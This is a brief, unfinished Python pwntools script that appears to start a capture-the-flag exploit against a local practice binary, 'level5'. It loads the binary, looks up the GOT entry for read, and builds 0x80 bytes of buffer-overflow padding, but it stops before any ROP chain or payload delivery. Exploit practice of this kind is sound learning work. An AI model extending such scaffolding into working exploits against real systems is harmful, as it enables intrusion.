from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=process('./level5')
elf=ELF('./level5')

read_got=elf.got['read']


payload=flat([
    b'a'*(0x80),
])


